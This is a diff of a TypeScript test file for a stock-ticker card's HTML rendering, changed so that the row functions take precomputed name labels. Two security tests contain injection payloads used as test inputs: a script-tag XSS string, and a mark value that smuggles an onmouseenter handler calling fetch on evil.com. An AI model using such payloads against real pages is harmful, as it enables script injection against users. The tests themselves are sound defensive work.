@@ -72,121 +72,125 @@ describe('stockRowHtml', () => {
   const stock = { symbol: 'aapl', name: 'Apple' };
 
   it('renders a stock row with stock-row class', () => {
-    expect(doc(stockRowHtml(stock, baseAttrs, 0)).querySelector('.stock-row')).not.toBeNull();
+    expect(
+      doc(stockRowHtml(stock, baseAttrs, 0, 'Apple')).querySelector('.stock-row')
+    ).not.toBeNull();
   });
 
   it('renders the stock name', () => {
     expect(
-      doc(stockRowHtml(stock, baseAttrs, 0)).querySelector('.col-name')?.textContent
+      doc(stockRowHtml(stock, baseAttrs, 0, 'Apple')).querySelector('.col-name')?.textContent
     ).toContain('Apple');
   });
 
   it('applies mark color as row background', () => {
-    const el = doc(stockRowHtml({ ...stock, mark: 'gold' }, baseAttrs, 0));
+    const el = doc(stockRowHtml({ ...stock, mark: 'gold' }, baseAttrs, 0, 'Apple'));
     expect(el.querySelector('.stock-row')?.getAttribute('style')).toContain('gold');
   });
 
   it('does not apply mark to the price cell', () => {
-    const el = doc(stockRowHtml({ ...stock, mark: 'gold' }, baseAttrs, 0));
+    const el = doc(stockRowHtml({ ...stock, mark: 'gold' }, baseAttrs, 0, 'Apple'));
     expect(el.querySelector('.col-price')?.getAttribute('style')).toContain('dimgray');
     expect(el.querySelector('.col-price')?.getAttribute('style')).not.toContain('gold');
   });
 
   it('renders no style attribute on row when mark is not set', () => {
-    const el = doc(stockRowHtml(stock, baseAttrs, 0));
+    const el = doc(stockRowHtml(stock, baseAttrs, 0, 'Apple'));
     expect(el.querySelector('.stock-row')?.getAttribute('style')).toBeNull();
   });
 
-  it('shows auto-detected ◆ icon for futures symbol', () => {
-    const el = doc(stockRowHtml({ symbol: 'gc_f', name: 'Gold' }, null, 0, 'auto'));
+  it('renders label with auto-detected ◆ icon for futures symbol', () => {
+    const el = doc(stockRowHtml({ symbol: 'gc_f', name: 'Gold' }, null, 0, '◆ Gold'));
     expect(el.querySelector('.col-name')?.textContent).toContain('◆ Gold');
   });
 
-  it('shows auto-detected ¤ icon for FX symbol', () => {
-    const el = doc(stockRowHtml({ symbol: 'usdpln_x', name: 'USD/PLN' }, null, 0, 'auto'));
+  it('renders label with auto-detected ¤ icon for FX symbol', () => {
+    const el = doc(stockRowHtml({ symbol: 'usdpln_x', name: 'USD/PLN' }, null, 0, '¤ USD/PLN'));
     expect(el.querySelector('.col-name')?.textContent).toContain('¤ USD/PLN');
   });
 
-  it('shows auto-detected △ icon for index symbol', () => {
-    const el = doc(stockRowHtml({ symbol: 'dji', name: 'DOW JONES' }, null, 0, 'auto'));
+  it('renders label with auto-detected △ icon for index symbol', () => {
+    const el = doc(stockRowHtml({ symbol: 'dji', name: 'DOW JONES' }, null, 0, '△ DOW JONES'));
     expect(el.querySelector('.col-name')?.textContent).toContain('△ DOW JONES');
   });
 
-  it('shows auto-detected ⬢ icon for crypto symbol', () => {
-    const el = doc(stockRowHtml({ symbol: 'btc_usd', name: 'Bitcoin' }, null, 0, 'auto'));
+  it('renders label with auto-detected ⬢ icon for crypto symbol', () => {
+    const el = doc(stockRowHtml({ symbol: 'btc_usd', name: 'Bitcoin' }, null, 0, '⬢ Bitcoin'));
     expect(el.querySelector('.col-name')?.textContent).toContain('⬢ Bitcoin');
   });
 
-  it('shows no icon for equity symbol in auto mode', () => {
-    const el = doc(stockRowHtml(stock, baseAttrs, 0, 'auto'));
+  it('renders plain name label when no icon applies', () => {
+    const el = doc(stockRowHtml(stock, baseAttrs, 0, 'Apple'));
     expect(el.querySelector('.col-name')?.textContent?.trim()).toBe('Apple');
   });
 
-  it('shows no icon in none mode even for index symbol', () => {
-    const el = doc(stockRowHtml({ symbol: 'dji', name: 'DOW JONES' }, null, 0, 'none'));
+  it('renders plain name label without icon when label has no prefix', () => {
+    const el = doc(stockRowHtml({ symbol: 'dji', name: 'DOW JONES' }, null, 0, 'DOW JONES'));
     expect(el.querySelector('.col-name')?.textContent?.trim()).toBe('DOW JONES');
     expect(el.querySelector('.col-name')?.textContent).not.toContain('△');
   });
 
-  it('uses per-entry icon override over auto-detection', () => {
-    const el = doc(stockRowHtml({ symbol: 'dji', name: 'DOW JONES', icon: '★' }, null, 0, 'auto'));
+  it('renders label with per-entry icon override', () => {
+    const el = doc(
+      stockRowHtml({ symbol: 'dji', name: 'DOW JONES', icon: '★' }, null, 0, '★ DOW JONES')
+    );
     expect(el.querySelector('.col-name')?.textContent).toContain('★ DOW JONES');
     expect(el.querySelector('.col-name')?.textContent).not.toContain('△');
   });
 
-  it('shows per-entry icon even when icons mode is none', () => {
-    const el = doc(stockRowHtml({ ...stock, icon: '★' }, baseAttrs, 0, 'none'));
+  it('renders label with per-entry icon when provided', () => {
+    const el = doc(stockRowHtml({ ...stock, icon: '★' }, baseAttrs, 0, '★ Apple'));
     expect(el.querySelector('.col-name')?.textContent).toContain('★ Apple');
   });
 
   it('renders with null attrs without throwing', () => {
-    const el = doc(stockRowHtml(stock, null, 0));
+    const el = doc(stockRowHtml(stock, null, 0, 'Apple'));
     expect(el.querySelector('.stock-row')).not.toBeNull();
     expect(el.querySelector('.col-name')?.textContent).toContain('Apple');
   });
 
   it('applies khaki background for PRE market state', () => {
-    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'PRE' }, 0));
+    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'PRE' }, 0, 'Apple'));
     expect(el.querySelector('.col-prepost')?.getAttribute('style')).toContain('khaki');
   });
 
   it('applies lightblue background for PREPRE market state', () => {
-    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'PREPRE' }, 0));
+    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'PREPRE' }, 0, 'Apple'));
     expect(el.querySelector('.col-prepost')?.getAttribute('style')).toContain('lightblue');
   });
 
   it('applies pink background for POST market state', () => {
-    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'POST' }, 0));
+    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'POST' }, 0, 'Apple'));
     expect(el.querySelector('.col-prepost')?.getAttribute('style')).toContain('pink');
   });
 
   it('applies indigo background for POSTPOST market state', () => {
-    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'POSTPOST' }, 0));
+    const el = doc(stockRowHtml(stock, { ...baseAttrs, marketState: 'POSTPOST' }, 0, 'Apple'));
     expect(el.querySelector('.col-prepost')?.getAttribute('style')).toContain('indigo');
   });
 
   it('applies lightgray 1d change background for REGULAR market state', () => {
-    const el = doc(stockRowHtml(stock, baseAttrs, 0));
+    const el = doc(stockRowHtml(stock, baseAttrs, 0, 'Apple'));
     expect(el.querySelector('.col-1d')?.getAttribute('style')).toContain('lightgray');
   });
 
-  it('does not inject HTML from stock name', () => {
-    const xssStock = { symbol: 'test', name: '<script>alert(1)</script>' };
-    const el = doc(stockRowHtml(xssStock, null, 0));
+  it('does not inject HTML from label content', () => {
+    const xssName = '<script>alert(1)</script>';
+    const el = doc(stockRowHtml({ symbol: 'test', name: xssName }, null, 0, xssName));
     expect(el.querySelector('script')).toBeNull();
     expect(el.querySelector('.col-name')?.textContent).toContain('<script>');
   });
 
   it('does not allow event handler injection via mark color', () => {
     const mark = 'red;" onmouseenter="fetch(\'evil.com\')"';
-    const el = doc(stockRowHtml({ ...stock, mark }, baseAttrs, 0));
+    const el = doc(stockRowHtml({ ...stock, mark }, baseAttrs, 0, 'Apple'));
     const row = el.querySelector('.stock-row') as HTMLElement;
     expect(row.onmouseenter).toBeNull();
     expect(row.getAttribute('style')).toContain('red');
   });
 
   it('renders data column via dataText', () => {
-    const el = doc(stockRowHtml(stock, baseAttrs, 1));
+    const el = doc(stockRowHtml(stock, baseAttrs, 1, 'Apple'));
     expect(el.querySelector('.col-data')).not.toBeNull();
   });
 });
@@ -207,7 +211,11 @@ describe('pinnedHtml', () => {
         attributes: { ...baseAttrs, regularMarketPrice: 5500, regularMarketChangePercent: -1 },
       },
     };
-    const el = doc(pinnedHtml(stocks, states, prefix, 0));
+    const rowMeta = new Map([
+      ['dji', 'DOW JONES'],
+      ['gspc', 'S&P 500'],
+    ]);
+    const el = doc(pinnedHtml(stocks, states, prefix, 0, rowMeta));
     const rows = el.querySelectorAll('.stock-row');
     expect(rows[0].querySelector('.col-name')?.textContent).toContain('DOW JONES');
     expect(rows[1].querySelector('.col-name')?.textContent).toContain('S&P 500');
@@ -215,21 +223,21 @@ describe('pinnedHtml', () => {
 
   it('renders gracefully when entity is missing', () => {
     const stocks = [{ symbol: 'unknown', name: 'Unknown' }];
-    const el = doc(pinnedHtml(stocks, {}, prefix, 0));
+    const el = doc(pinnedHtml(stocks, {}, prefix, 0, new Map([['unknown', 'Unknown']])));
     expect(el.querySelector('.col-name')?.textContent).toContain('Unknown');
   });
 
   it('passes mark color to stock row', () => {
     const stocks = [{ symbol: 'sabr', name: 'Sabre', mark: 'gold' }];
     const states = { 'sensor.yahoofinance_sabr': { attributes: baseAttrs } };
-    const el = doc(pinnedHtml(stocks, states, prefix, 0));
+    const el = doc(pinnedHtml(stocks, states, prefix, 0, new Map([['sabr', 'Sabre']])));
     expect(el.querySelector('.stock-row')?.getAttribute('style')).toContain('gold');
   });
 
-  it('propagates iconsMode to stock rows', () => {
+  it('renders pre-computed icon label', () => {
     const stocks = [{ symbol: 'gc_f', name: 'Gold' }];
     const states = { 'sensor.yahoofinance_gc_f': { attributes: baseAttrs } };
-    const el = doc(pinnedHtml(stocks, states, prefix, 0, 'auto'));
+    const el = doc(pinnedHtml(stocks, states, prefix, 0, new Map([['gc_f', '◆ Gold']])));
     expect(el.querySelector('.col-name')?.textContent).toContain('◆ Gold');
   });
 });
@@ -250,7 +258,11 @@ describe('sortedHtml', () => {
         attributes: { ...baseAttrs, regularMarketChangePercent: 5 },
       },
     };
-    const el = doc(sortedHtml(stocks, states, prefix, 0));
+    const rowMeta = new Map([
+      ['low', 'LowChange'],
+      ['high', 'HighChange'],
+    ]);
+    const el = doc(sortedHtml(stocks, states, prefix, 0, rowMeta));
     const rows = el.querySelectorAll('.stock-row');
     expect(rows[0].querySelector('.col-name')?.textContent).toContain('HighChange');
     expect(rows[1].querySelector('.col-name')?.textContent).toContain('LowChange');
@@ -266,7 +278,11 @@ describe('sortedHtml', () => {
         attributes: { ...baseAttrs, regularMarketChangePercent: 3 },
       },
     };
-    const el = doc(sortedHtml(stocks, states, prefix, 0));
+    const rowMeta = new Map([
+      ['known', 'Known'],
+      ['unknown', 'Unknown'],
+    ]);
+    const el = doc(sortedHtml(stocks, states, prefix, 0, rowMeta));
     const rows = el.querySelectorAll('.stock-row');
     expect(rows[0].querySelector('.col-name')?.textContent).toContain('Known');
     expect(rows[1].querySelector('.col-name')?.textContent).toContain('Unknown');
@@ -275,14 +291,14 @@ describe('sortedHtml', () => {
   it('passes mark color to sorted rows', () => {
     const stocks = [{ symbol: 'sabr', name: 'Sabre', mark: 'gold' }];
     const states = { 'sensor.yahoofinance_sabr': { attributes: baseAttrs } };
-    const el = doc(sortedHtml(stocks, states, prefix, 0));
+    const el = doc(sortedHtml(stocks, states, prefix, 0, new Map([['sabr', 'Sabre']])));
     expect(el.querySelector('.stock-row')?.getAttribute('style')).toContain('gold');
   });
 
-  it('propagates iconsMode to sorted rows', () => {
+  it('renders pre-computed icon label in sorted rows', () => {
     const stocks = [{ symbol: 'usdpln_x', name: 'USD/PLN' }];
     const states = { 'sensor.yahoofinance_usdpln_x': { attributes: baseAttrs } };
-    const el = doc(sortedHtml(stocks, states, prefix, 0, 'auto'));
+    const el = doc(sortedHtml(stocks, states, prefix, 0, new Map([['usdpln_x', '¤ USD/PLN']])));
     expect(el.querySelector('.col-name')?.textContent).toContain('¤ USD/PLN');
   });
 });
